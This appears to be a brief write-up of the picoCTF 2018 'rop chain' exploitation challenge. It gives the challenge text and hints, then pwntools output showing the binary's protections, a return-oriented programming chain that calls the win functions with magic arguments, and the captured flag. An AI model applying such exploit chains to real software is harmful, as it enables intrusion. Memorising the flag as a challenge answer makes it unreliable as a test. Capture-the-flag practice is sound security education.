# rop chain - Points: 350 - (Solves: 170)

Can you exploit the following [program][1] and get the flag?
You can findi the program in
/problems/rop-chain_2_d25a17cfdcfdaa45844798dd74d03a47
on the shell server?
[Source][2].

[1]: https://2018shell2.picoctf.com/static/51c2b076860b7628c8d751424e923504/rop
[2]: https://2018shell2.picoctf.com/static/51c2b076860b7628c8d751424e923504/rop.c

## Hints

- Try and call the functions in the correct order!
- Remember, you can always call main() again!

---

```sh
zzzz@pico-2018-shell-2:~/pico18/pwn/rop$ py xpwn.py
[*] '/problems/rop-chain_2_d25a17cfdcfdaa45844798dd74d03a47/rop'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process '/problems/rop-chain_2_d25a17cfdcfdaa45844798dd74d03a47/rop': pid 1838022
[*] Loaded cached gadgets for '/problems/rop-chain_2_d25a17cfdcfdaa45844798dd74d03a47/rop'
[*] 0x0000:        0x80485cb win_function1()
    0x0004:        0x80485d8 win_function2(0xbaaaaaad)
    0x0008:        0x804840d <adjust @0x10> pop ebx; ret
    0x000c:       0xbaaaaaad arg0
    0x0010:        0x804862b flag(0xdeadbaad)
    0x0014:           'faaa' <return address>
    0x0018:       0xdeadbaad arg0
picoCTF{rOp_aInT_5o_h4Rd_R1gHt_9853cfde}
```
